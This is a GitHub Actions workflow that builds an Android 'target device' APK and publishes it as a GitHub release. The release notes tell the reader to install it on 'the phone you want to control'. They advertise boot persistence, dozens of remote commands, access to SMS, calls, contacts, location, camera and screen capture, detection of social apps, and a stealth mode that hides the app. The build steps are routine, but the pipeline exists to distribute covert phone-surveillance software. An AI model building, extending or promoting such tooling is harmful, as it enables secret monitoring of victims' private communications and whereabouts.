name: Build & Release Target APK

on:
  push:
    branches: [ main ]
    paths-ignore:
      - '**.md'
      - '.gitignore'
  workflow_dispatch:
    inputs:
      reason:
        description: 'Build reason'
        required: false
        default: 'Manual build'

permissions:
  contents: write

jobs:
  build:
    name: Build Target APK
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Cache Gradle
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: gradle-target-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
          restore-keys: gradle-target-

      - name: Grant execute permission
        run: chmod +x gradlew

      - name: Build Release APK
        run: |
          ./gradlew assembleRelease --stacktrace 2>&1 | tee build-output.txt

      - name: Check APK exists
        run: |
          find app/build/outputs -name "*.apk" 2>/dev/null || true
          if [ -f app/build/outputs/apk/release/app-release.apk ]; then
            echo "APK found!"
            ls -lh app/build/outputs/apk/release/app-release.apk
          else
            APK=$(find app/build -name "*.apk" 2>/dev/null | head -1)
            if [ -n "$APK" ]; then
              echo "APK found at: $APK"
              cp "$APK" app/build/outputs/apk/release/app-release.apk
            else
              echo "ERROR: APK not found!"
              exit 1
            fi
          fi

      - name: Get version info
        id: version
        run: |
          VNAME=$(grep 'versionName' app/build.gradle.kts | head -1 | sed 's/.*"\([^"]*\)".*/\1/')
          VCODE=$(grep 'versionCode' app/build.gradle.kts | head -1 | sed 's/.*=\s*\([0-9]*\).*/\1/')
          echo "version=$VNAME" >> $GITHUB_OUTPUT
          echo "code=$VCODE" >> $GITHUB_OUTPUT
          echo "Version: $VNAME ($VCODE)"

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: Abu-Zahra-Target-v${{ steps.version.outputs.version }}
          path: app/build/outputs/apk/release/app-release.apk
          retention-days: 30

      - name: Upload build log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: target-build-log-${{ github.run_number }}
          path: build-output.txt
          retention-days: 7

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: target-v${{ steps.version.outputs.version }}
          name: "Target App v${{ steps.version.outputs.version }} - Build #${{ github.run_number }}"
          body: |
            ## Abu Zahra Target Device App v${{ steps.version.outputs.version }}

            **Install this APK on the TARGET device (the phone you want to control).**

            ### Setup Instructions
            1. Install this APK on the target phone
            2. Open the app - it will show a 6-character link code
            3. In the Control Panel app, go to "ربط جهاز جديد"
            4. Enter the link code to connect

            ### Features
            - Auto-starts on boot
            - 47+ remote commands supported
            - SMS, calls, contacts, location, battery, WiFi, storage
            - Camera, screen capture, file browser
            - Social app detection (WhatsApp, Telegram, etc.)
            - App hide/show for stealth mode

            **Built by GitHub Actions** | Run #${{ github.run_number }}
          files: app/build/outputs/apk/release/app-release.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Build Summary
        run: |
          echo "## Target App Build Summary" >> $GITHUB_STEP_SUMMARY
          echo "- **Version**: v${{ steps.version.outputs.version }}" >> $GITHUB_STEP_SUMMARY
          echo "- **Status**: SUCCESS" >> $GITHUB_STEP_SUMMARY
          echo "- **APK Size**: $(ls -lh app/build/outputs/apk/release/app-release.apk | awk '{print $5}')" >> $GITHUB_STEP_SUMMARY
          echo "- **Install on**: TARGET device" >> $GITHUB_STEP_SUMMARY
